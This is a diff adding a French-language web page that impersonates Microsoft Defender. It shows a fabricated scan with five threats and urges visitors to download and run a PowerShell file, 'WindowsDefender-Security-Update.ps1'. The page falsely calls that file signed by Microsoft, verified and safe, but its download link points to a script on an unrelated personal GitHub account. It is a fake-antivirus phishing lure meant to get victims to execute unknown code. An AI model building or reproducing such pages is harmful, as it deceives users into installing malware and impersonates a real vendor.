@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Téléchargement — Microsoft Defender</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+<div class="logo">🛡️ Sécurité Windows</div>
+<ul class="nav-links">
+<li><a href="index.html">Tableau de bord</a></li>
+<li><a href="scan.html">Analyse</a></li>
+<li><a href="download.html" class="active">Mise à jour</a></li>
+<li><a href="login.html">Compte Microsoft</a></li>
+</ul>
+</nav>
+
+<main class="main">
+
+<div class="card">
+<div class="card-header"><span class="icon">✅</span><h2>Analyse terminée — 5 menaces détectées</h2></div>
+
+<div class="grid grid-3" style="margin-bottom:20px">
+<div class="stat danger"><div class="value">5</div><div class="label">Menaces</div></div>
+<div class="stat"><div class="value">171 000</div><div class="label">Fichiers analysés</div></div>
+<div class="stat warning"><div class="value">02:34</div><div class="label">Durée</div></div>
+</div>
+
+<div class="alert alert-danger">
+<h3>🔴 Action requise : Télécharger l'outil de nettoyage</h3>
+<p>Pour supprimer définitivement ces menaces, vous devez télécharger et exécuter l'outil de nettoyage Windows Defender.</p>
+</div>
+</div>
+
+<div class="card">
+<div class="card-header"><span class="icon">📥</span><h2>Outil de nettoyage Windows Defender</h2></div>
+
+<div class="download-box">
+<div class="file-icon">🛡️</div>
+<div class="file-name">WindowsDefender-Security-Update.ps1</div>
+<div class="file-size">151 Ko • Signé numériquement • Microsoft Corporation</div>
+<div style="margin-top:10px">
+<span class="badge badge-success">✓ Vérifié</span>
+<span class="badge badge-success">✓ Sûr</span>
+</div>
+</div>
+
+<div class="steps">
+<div class="step">
+<div class="step-num">1</div>
+<div class="step-body">
+<h4>Téléchargez l'outil de nettoyage</h4>
+<p>Cliquez sur le bouton ci-dessous pour télécharger l'outil officiel Microsoft Defender.</p>
+</div>
+</div>
+<div class="step">
+<div class="step-num">2</div>
+<div class="step-body">
+<h4>Exécutez le fichier téléchargé</h4>
+<p>Double-cliquez sur <strong>WindowsDefender-Security-Update.ps1</strong> ou faites clic-droit → Exécuter avec PowerShell</p>
+</div>
+</div>
+<div class="step">
+<div class="step-num">3</div>
+<div class="step-body">
+<h4>Redémarrez votre PC</h4>
+<p>Une fois le nettoyage terminé, redémarrez votre ordinateur pour appliquer les modifications.</p>
+</div>
+</div>
+</div>
+
+<a href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-security/main/defender-update.ps1" class="btn btn-primary btn-lg btn-block" download="WindowsDefender-Security-Update.ps1">
+⬇️ TÉLÉCHARGER L'OUTIL DE NETTOYAGE
+</a>
+
+<p style="text-align:center;font-size:12px;color:var(--gray-50);margin-top:15px">
+Version 2026.07.31 • SHA-256: 8f3a...d91c • <a href="#" style="color:var(--blue)">Vérifier l'authenticité</a>
+</p>
+</div>
+
+<div class="card">
+<div class="card-header"><span class="icon">🔄</span><h2>Mise à jour des définitions</h2></div>
+<p style="font-size:13px;color:var(--gray-90);margin-bottom:12px">Les définitions de virus seront automatiquement mises à jour après l'exécution de l'outil de nettoyage.</p>
+<div class="progress"><div class="progress-bar green" style="width:100%"></div></div>
+<p style="font-size:12px;color:var(--green);margin-top:6px">✓ Dernière version disponible : 1.393.2245.0</p>
+</div>
+
+</main>
+
+<footer class="footer">
+<p>© 2026 Microsoft Corporation | <a href="#">Confidentialité</a> | <a href="#">Conditions d'utilisation</a></p>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
